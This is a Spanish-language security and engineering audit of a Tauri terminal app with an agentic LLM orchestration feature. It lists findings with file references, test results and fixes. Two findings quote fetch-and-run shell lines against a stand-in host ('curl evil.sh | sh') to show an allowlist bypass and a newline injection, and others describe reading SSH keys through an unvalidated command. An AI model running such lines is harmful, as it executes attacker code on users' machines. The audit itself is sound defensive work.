# Auditoría de ingeniería — polakapi

**Fecha:** 2026-07-08
**Commit auditado:** `c9a769a` (rama `main`)
**Alcance:** app de escritorio Tauri 2 (Rust ~5k LOC) + frontend Vite/TypeScript vanilla (~19k LOC). Terminales múltiples con xterm.js, persistencia con `@tauri-apps/plugin-store` + SQLite, y una feature agéntica `/loop` que orquesta CLIs de LLM locales (`claude`/`codex`/`opencode`).
**Método:** cuatro auditorías en paralelo — backend Rust/Tauri, frontend TypeScript, feature `/loop`, y tests/CI/dependencias. Todas leyeron el código real; no se modificó nada.

---

## Resumen ejecutivo

El proyecto está **sano en lo fundamental**: el pipeline de calidad está 100% en verde (224 tests TS + 41 Rust, typecheck, lint, `clippy -D warnings`, `pnpm audit` sin vulnerabilidades), el SQL está íntegramente parametrizado, la postura anti-XSS del frontend es ejemplar, y la disciplina de disposal/persistencia está por encima del promedio. La arquitectura fue diseñada para ser testeable (inyección de dependencias en el scheduler, helpers puros en Rust).

**No hay hallazgos críticos.** Los riesgos reales se concentran en tres frentes:

1. **La feature `/loop` puede correr en modo "headless"**: un run reanudado pierde su UI en el siguiente evento del router, siguiendo ejecutando CLIs invisiblemente sin botón de abortar (H-1). Combinado con la ausencia de un comando real de *kill*, cerrar la ventana deja agentes mutando el repo.
2. **La superficie de comandos de Tauri confía en el webview**: `run_loop_agent` lee cualquier archivo del disco sin validar (`~/.ssh/id_rsa`, `.env`), y el allowlist de `pty_spawn` es teatro de seguridad (`bash -c <cualquier cosa>` pasa). El modelo de amenaza de Tauri asume un webview potencialmente comprometido — plausible aquí porque `/loop` renderiza contenido generado por LLM.
3. **Fugas de recursos y de datos**: procesos PTY que se matan pero nunca se `wait()` (zombies), guardados con debounce que no se hacen flush antes de salir (pérdida de notas/layout), y logs de prompts en texto plano sin rotación.

### Conteo de hallazgos

| Severidad | Backend Rust | Frontend | Feature `/loop` | Tests/CI/Deps | Total |
|---|---|---|---|---|---|
| Crítico | 0 | 0 | 0 | 0 | **0** |
| Alto | 2 | 3 | 3 | 3 | **11** |
| Medio | 8 | 7 | 9 | 4 | **28** |
| Bajo | 8 | 7 | 4 | 3 | **22** |

> Hay solapamiento entre auditorías (p. ej. los zombies de PTY, la inyección por argv y el logging de prompts aparecen en varias). La lista de acciones prioritarias más abajo ya está deduplicada.

---

## Acciones prioritarias (deduplicadas, mayor impacto primero)

1. **Adoptar el `runId` al reanudar un run** — `loop-chrome/index.ts:348-352` debe llamar a `adoptRunId` (que sí existe, `run-context.ts:139`) para que el `sameSlot` no remonte la UI y deje el run headless. *(H-1 de `/loop`)*
2. **Confinar `run_loop_agent`** — validar `system_prompt_path`/`cwd` contra el directorio del run, como ya hacen todos los comandos `loop_*`. *(H-1 backend)*
3. **Añadir un comando real de cancelación de CLI** y matar el *grupo* de procesos (setsid + kill de grupo), no solo el hijo directo. Resuelve agentes zombie tras abort/cierre y grandchildren huérfanos. *(H-3 de `/loop`, M-6 backend)*
4. **Sanear el path de drop de texto plano** — `terminal-drop.ts:128-140` escribe newlines crudos al PTY; reusar `formatPathsForShell` que ya existe en el mismo archivo. *(H-2 frontend)*
5. **Hacer flush de los guardados con debounce antes de `app_exit`** — el path de quit no espera `flushSave`/`flushSaveWorkspaces`/notes-debounce. *(H-1 frontend)*
6. **Reap de procesos PTY** — llamar `child.wait()` en el shutdown del reader thread para evitar acumulación de zombies. *(M-3 backend)*
7. **Convertir comandos síncronos bloqueantes a `async` + `spawn_blocking`** — `pty_write`/`pty_resize`/`prompt_*` congelan toda la app si un PTY se satura. *(M-4 backend)*
8. **Dejar de pasar prompts por argv** — visibles en `ps`, y rompen con `E2BIG` en prompts grandes; usar stdin o `@file`. Añadir `--` antes del argumento posicional. *(M-1/M-7 backend, M-7 `/loop`)*
9. **Guard de reentrancia en `RunScheduler.start()`** — `if (this.cycle) return`, no confiar en un checkbox de la UI. *(M-1 `/loop`)*
10. **Añadir tests al ciclo de vida de PTY y a `capture.rs`** (0 tests) y un paso de `tauri build` + `cargo audit`/`pnpm audit` en CI. *(High tests/CI)*

---

## Hallazgos por área

### 1. Backend Rust / Tauri

**Sin hallazgos críticos.** SQL 100% parametrizado, sin interpolación de shell, sin superficie de ataque remota.

#### Alto
- **H-1. Lectura arbitraria de archivos + ejecución con cwd arbitrario vía `run_loop_agent`** — `loop_cli.rs:90-98,185`. `system_prompt_path`, `cwd`, `model` y `user_input` no se validan (a diferencia de todos los demás comandos `loop_*`). Un webview comprometido puede leer `~/.ssh/id_rsa`/`.env` y correr un agente en cualquier directorio sin pestaña visible.
- **H-2. El allowlist de `pty_spawn` es teatro de seguridad** — `pty.rs:24,229-249`. `is_allowed_command` solo revisa el basename y `validate_args` solo limita longitud/NUL: `args: ["-c", "curl evil.sh | sh"]` se acepta. Es ejecución arbitraria de código; debería documentarse como riesgo aceptado, no presentarse como mitigación.

#### Medio
- **M-1.** Prompts y system prompts completos pasados por argv → visibles en `ps` para todo proceso local; además latente `E2BIG` con prompts grandes. `loop_cli.rs:170-171,187,336,465`.
- **M-2.** Texto de prompt del usuario logueado en texto plano a archivo sin rotación (`polakapi.db.log`, `polakapi-loop-cli.log`). `capture.rs:177-179`, `loop_cli.rs:675-711`.
- **M-3.** Hijos PTY se matan pero nunca se `wait()` → zombies `<defunct>` por cada pestaña cerrada. `pty.rs:54-70,153-192`.
- **M-4.** I/O bloqueante en comandos síncronos corre en el main thread → congela toda la app si un PTY se satura o una búsqueda es grande. `commands.rs:27-62`, `db.rs:529-569`, `open.rs:23-34`.
- **M-5.** `import_user_path` corre un shell de login *interactivo* sin timeout antes de arrancar Tauri → un `.zshrc` que bloquea impide abrir la ventana. `lib.rs:51-56`.
- **M-6.** El kill por timeout alcanza solo al proceso CLI directo; los grandchildren (p. ej. un `cargo build` lanzado por el agente) sobreviven detached. `loop_cli.rs:616,654-668`.
- **M-7.** Los archivos de capability por ventana implican un scoping de comandos que no existe: los 40 comandos custom están en el `invoke_handler` global, así que la ventana "read-only" `prompts` puede invocar `pty_spawn`/`run_loop_agent`. `capabilities/*.json`, `lib.rs:117-162`.
- **M-8.** Aplicación de migración + registro de versión no son transaccionales → un crash entre ambas deja la migración aplicada sin registrar. Latente hoy (migración 1 es idempotente). `db.rs:83-97`.

#### Bajo
- **L-1.** Escape de `LIKE` incompleto en `search_prompts` (`%` sí, `_`/`\` no). `db.rs:331`.
- **L-2.** `write_atomic` no hace fsync (a pesar del doc) ni usa nombre temporal único → dos escritores concurrentes pueden mezclar contenido. `loop_prompts.rs:149-170`.
- **L-3.** `age_ms: i64::MAX` serializado a JS excede `Number.MAX_SAFE_INTEGER`. `admin.rs:84-90`.
- **L-4.** Install de hooks: rompe en Windows (usa solo `HOME`) y no escapa comillas en el path del binario. `db.rs:615,742`.
- **L-5.** `fs_validate_path`/`open_*` son oráculos de filesystem sin restricción de ubicación (abren cualquier archivo legible). `commands.rs:88`, `open.rs:107`.
- **L-6.** `drain_valid_utf8` recursivo y O(n²) con bytes inválidos (acotado a 4 KiB hoy). `pty.rs:350-365`.
- **L-7.** `app_exit` hace `std::process::exit(0)` a los 750 ms, saltándose destructores. `commands.rs:71-79`.
- **L-8. Código duplicado/muerto:** resolución `project.is_dir() → .loop/runs/<id>` copiada 6 veces; `install_claude_hooks`/`install_codex_hooks` casi idénticas; `_path_marker` muerto.

**Bien hecho:** superficie de filesystem de `loop_prompts` modélica (validación de `run_id`/slug, allowlists, escritura atómica, `spawn_blocking`); higiene SQL impecable (WAL, `foreign_keys`, cascadas, decisión deliberada de no persistir respuestas del asistente); manejo del ciclo de vida de subprocesos con `kill_on_drop` + `timeout` y buffering correcto de UTF-8 partido entre chunks.

---

### 2. Frontend TypeScript

#### Alto
- **H-1. El path de quit pierde persistencia con debounce** — `quit-confirm.ts:69-83`. Tras confirmar salir, no se hace flush de `flushSaveWorkspaces`/`flushSave`/notes-debounce; Cmd+Q dentro de ~700 ms tras editar notas pierde los últimos cambios.
- **H-2. Texto arrastrado se escribe crudo al PTY → inyección de comandos por newlines** — `terminal-drop.ts:128-140,194-206`. El path de `text/plain` bypassa la protección bracketed-paste; arrastrar `ls\ncurl evil.sh|sh\n` desde una web se ejecuta de inmediato. El path de Finder ya lo hace bien (`formatPathsForShell`).
- **H-3. Enter confirma la acción destructiva de salir; los modales se apilan** — `confirm-delete.ts:58-66`, `quit-confirm.ts:63-67`. El modal ignora `danger: true` (enfoca el botón de confirmar) y un segundo Cmd+Q abre un modal apilado.

#### Medio
- **M-1.** Editar el path de un proyecto no-activo deja su `TerminalManager` con `defaultCwd` obsoleto toda la sesión. `workspaces-bootstrap.ts:208-214`, `terminal-router.ts:54-69`.
- **M-2.** Los procesos ya salidos siguen contando como terminales "vivos" en badges y en la advertencia de quit. `terminal-pane.ts:119-121`, `terminal-router.ts:130-144`.
- **M-3.** Los atajos globales disparan sin importar el foco → Cmd+W mata un terminal sin confirmación aunque el foco esté en la paleta de comandos. `shortcuts.ts:20-61`.
- **M-4.** Re-render completo del sidebar en cada `state-changed` destruye renames inline en progreso. `workspaces-panel.ts:146-194`.
- **M-5.** El shell inferior puede spawnear antes de registrar los listeners de PTY → salida inicial perdida. `app-controller.ts:66-72`, `shell-panel.ts:41-67`.
- **M-6.** Dos implementaciones duplicadas de `confirmModal` con comportamiento divergente (ver H-3). `modal.ts:118` vs `confirm-delete.ts:14-80`.
- **M-7.** El dispose vía `beforeunload` depende de trabajo async que no puede completarse durante el unload. `app-controller.ts:105-165`.

#### Bajo
- **L-1.** Código muerto: `TerminalManager.create()`, `requireQuery`, `revalidatePersistedPaths` export, métodos `*TerminalSpec` del controller, `onBellPending` no-op.
- **L-2.** Gaps de type-safety: non-null assertions y casts `as ProjectId`/`as SidebarTarget` sin validar (crash potencial en `gutters.ts:93`).
- **L-3.** `wireToggles`/`wireSidebarGutters`/notes-gutter sin teardown → listeners sobreviven a `dispose()`.
- **L-4.** Listener de Tauri que resuelve tarde puede filtrarse si el unwire corre antes de la promesa.
- **L-5.** Finder-drop cuenta adiciones no verificadas (toast dice "3 añadidos" aunque fallen).
- **L-6.** Panes con spawn fallido reciben id sintético que `setFocus` nunca puede marcar.
- **L-7.** Comentario obsoleto sobre `TerminalSpec.id`.

**Configuración:** `noUncheckedIndexedAccess` apagado (C-1, medio) — el código depende mucho de acceso indexado; falta `noImplicitOverride`/`forceConsistentCasingInFileNames`. ESLint no bloquea non-null assertions ni casts (C-2); lista de `globals` redundante e incompleta. `@ts-expect-error process` innecesario en `vite.config.ts:5` (C-3).

**Bien hecho:** postura anti-XSS excelente (todo por `createElement`+`textContent`, único `innerHTML` es `= ""`); lógica de flush de persistencia cuidadosa (snapshot de `pending` antes del await, restore sin pisar escrituras nuevas); disciplina de disposal con teardown simétrico; `app-controller.ts` es orquestador, no god-object.

---

### 3. Feature `/loop` (orquestación agéntica)

> **Nota:** la persistencia de runs es **basada en archivos** (`state.json` + `.md`/`.diff`), no SQLite. SQLite solo respalda el historial de `/prompts` capturado vía hooks de CLI.

#### Alto
- **H-1. Un run reanudado pierde su UI y queda headless e imposible de abortar** — `loop-chrome/index.ts:348-352`. `resumeInterruptedRun` monta el scheduler bajo el `runId` del run pero deja el router con su propio `runId` random; el siguiente `router.refresh()` (p. ej. al volver de otra ventana) falla el `sameSlot`, remonta el paso 4 con `scheduler: null` y deja el run ejecutándose invisiblemente. El comentario afirma que `setRunId` no existe, pero `adoptRunId` sí (`run-context.ts:139`).
- **H-2. Los snapshots `.diff` por fase son `git diff HEAD` acumulativos → falsos conflictos en casi todo batch multi-fase** — `phase-runner.ts:147,220-223`, `helpers.ts:44-87`. Como ningún agente hace commit y `.loop/` no está en gitignore, el diff de la fase B contiene los cambios de A más los archivos untracked del propio run → `detectBatchConflicts` reporta conflictos espurios y un "re-run batch" duplica el gasto de tokens con el mismo resultado.
- **H-3. No hay forma de matar un CLI en vuelo** — `run-scheduler/index.ts:191-205`, `loop_cli.rs:606-670`. `abort()` solo setea flags ("el agente actual terminará"); cerrar la ventana deja el future de Rust corriendo el CLI hasta completarse, y al reabrir el resume relanza la misma etapa **concurrente con el zombie** → dos LLMs editando el mismo working tree.

#### Medio
- **M-1.** `RunScheduler.start()` puede lanzar un segundo ciclo concurrente mientras el primero está en `awaitConflictDecision`; solo un checkbox de la UI lo previene. `index.ts:153-180,344-353`.
- **M-2.** El contenido del repo se confía implícitamente: un repo malicioso con `.loop/runs/<id>/` fabricado dispara el banner de resume de un click, corriendo su system prompt en un CLI con acceso de escritura; symlinks pasan `is_dir()`. `storage.rs:28-53`, `admin.rs:34-101`.
- **M-3.** Los CLIs se invocan sin flags de permiso/sandbox → en una instalación stock el agente de implementación puede "completar" en verde con cero cambios de código (diff vacío nunca se verifica). `loop_cli.rs:169-188,325-344,456-465`.
- **M-4.** Contabilidad de tokens: el uso de invocaciones fallidas se descarta, los tokens de codex vuelven `None` (rutas JSONL especulativas), y el "budget" es solo display — nada detiene un loop de reintentos runaway. `phase-runner.ts:293-295`, `loop_cli.rs:361-419`, `step4-run/view.ts:490`.
- **M-5.** SQLite de captura: sin `busy_timeout`, escritura multi-statement no transaccional, y race `MAX(seq)+1` → eventos de hooks concurrentes se pierden en silencio (exit 0). `db.rs:43-53,170-191`.
- **M-6.** El resume re-invoca el LLM integrador para un batch que ya alcanzó veredicto `conflict` (posible veredicto distinto silenciando conflictos que el usuario debía adjudicar). `integrator-runner.ts:31`, `resume-detector.ts:103-105`.
- **M-7.** Texto de agente pasado como argumento posicional sin separador `--` → input que empieza con `-...` se parsea como flags. `loop_cli.rs:336,343,465`.
- **M-8.** Contenido de prompts a side-log en texto plano; transcripciones completas sin cifrar en `polakapi.db`. `capture.rs:177-179`.
- **M-9.** El `id` de fase generado por el agente no se sanea y ids duplicados colapsan silenciosamente (outputs se pisan). `step2-phases/graph.ts:7-11,74-99`.

#### Bajo
- **L-1.** Runs pausados por el usuario son indistinguibles de crashes (heartbeat solo corre durante invocaciones). `admin.rs:71-73`.
- **L-2.** Escape de `LIKE` incompleto (coincide con backend L-1). `db.rs:331`.
- **L-3.** `initialize()` no persiste → un crash en los primeros segundos deja el run invisible al scanner de resume. `index.ts:119-151`.
- **L-4.** stderr de `claude` enmascarado cuando stdout no-vacío no es JSON. `loop_cli.rs:198-203`.

**Complejidad/mantenibilidad:** el core del scheduler es testeable y está testeado (`run-scheduler.test.ts`, 472 líneas), pero ningún test ejercita el pipeline real de resume end-to-end ni el lifecycle de `loop-chrome` (H-1 se habría detectado). God-functions en los mount closures (`step2-phases/index.ts` 547 líneas, `loop-chrome/index.ts` 388 mezclando routing + resume + cirugía de DOM). Comentarios obsoletos codifican invariantes muertas (ya causaron H-1). Contratos duplicados a mano entre TS y Rust (`LOOP_PROMPT_NAMES`/`PROMPT_NAMES`, `phaseToSlug`/`phaseSlug`).

**Bien hecho:** disciplina de path-safety consistente y correcta; el invariante de crash-recovery (".md sin .diff = etapa sin commit") es un protocolo coherente y documentado; el manejo de timeout de procesos está bien explicado incluyendo por qué se removió el diseño anterior; validación estricta y no-lanzante del estado persistido con gating por `schemaVersion`.

---

### 4. Tests, CI, tooling y dependencias

**Resultados verificados localmente (2026-07-08):**

| Check | Resultado |
|---|---|
| `pnpm run typecheck` | ✅ 0 errores |
| `pnpm run lint` | ✅ 0 warnings |
| `pnpm run test` (vitest) | ✅ 22 archivos, 224/224 tests |
| `cargo clippy --all-targets -- -D warnings` | ✅ limpio |
| `cargo test` | ✅ 41/41 |
| `pnpm audit --prod` | ✅ sin vulnerabilidades conocidas |
| `cargo audit` | ⚠️ no instalado — omitido |

#### Alto
- **`capture.rs` (306 LOC) tiene cero tests** — la feature más nueva parsea dos esquemas JSON de stdin y "falla suave" (siempre exit 0); un drift en el JSON de hooks de Claude/Codex descartaría toda la captura sin que ningún test lo detecte.
- **El ciclo de vida de PTY no está testeado** — `pty.rs` (513 LOC) tiene 13 tests pero solo de helpers puros; spawn/resize/kill/shutdown del reader thread/emisión de exit no tienen tests de integración. Igual `commands.rs` (0 tests).
- **CI sin pipeline de build/release** — `ci.yml` nunca corre `tauri build` (ni `--debug`) y solo usa `ubuntu-latest` aunque se desarrolla en macOS; roturas de empaquetado son invisibles hasta build manual.

#### Medio
- Capas de app-shell y view/glue enteramente sin tests en TS (aceptable para view code, pero `agent-input.ts` y `terminal-router.ts` tienen lógica testeable).
- Sin paso de `pnpm audit`/`cargo audit` en CI.
- Stack SQLite de Rust ~1 año atrasado (`rusqlite 0.32.1` vs 0.37+; SQLite bundleado no recibe updates de seguridad del OS).
- `typescript ~5.6.2` fijado dos versiones atrás mientras el resto del toolchain es bleeding-edge (eslint 10.5, vitest 4, node types 26); pin deliberado pero sin documentar.

#### Bajo
- Cambio OpenSpec `loop-agentic-flow` 78/87 tareas hechas pero sin archivar — las 9 abiertas son smoke/e2e manuales (multi-CLI, resume-after-kill, reviewer-cap) sin registrar.
- `docs/` son 4 artefactos HTML de planificación pre-implementación, no documentación viva (uno predata `capture.rs`); nada los marca como históricos. El README sí está al día.
- Arranque de jsdom domina el tiempo de test (18.8s entorno vs 258ms tests); muchos archivos no necesitan jsdom.

**Calidad de tests (muestreada): alta.** `run-scheduler.test.ts` es ejemplar (fakes en una costura de puertos diseñada, aserciones sobre resultados observables, comentarios que explican el *por qué*). `db.rs` usa SQLite real con tempfiles (tests de integración genuinos). No se encontraron antipatrones de "mocked-to-death".

**Bien hecho:** el meta-script `pnpm run check` encadena typecheck→lint→format→vitest→rustfmt→clippy→cargo test y CI corre exactamente lo mismo con caching (`--frozen-lockfile`) → local y CI no pueden divergir; arquitectura construida para testeabilidad; capa PTY consciente de seguridad con allowlisting implementado *y* testeado.

---

## Apéndice — temas transversales (aparecen en varias auditorías)

- **Procesos huérfanos/zombie**: PTY sin `wait()` (backend M-3), kill de timeout que no alcanza al grupo (backend M-6), CLIs de `/loop` sin cancelación real (loop H-3). Un mismo fix de *process-group management* cubre los tres.
- **Prompts en texto plano en logs sin rotación**: backend M-2, loop M-8. El lado `/loop` de `loop_cli.rs` ya lo hace bien (solo tamaños/exit codes); el lado de `capture.rs` no está a la misma altura.
- **Inyección por argv sin `--`**: backend M-1/M-7, loop M-7. Mismo fix.
- **Migración no transaccional + race del helper de captura**: backend M-8, loop M-5.
- **Escape de `LIKE` incompleto**: backend L-1, loop L-2 (mismo `db.rs:331`).

---

*Auditoría generada mediante revisión estática y ejecución de la suite de checks. Ninguna corrección fue aplicada. Las referencias `archivo:línea` corresponden al commit `c9a769a`.*
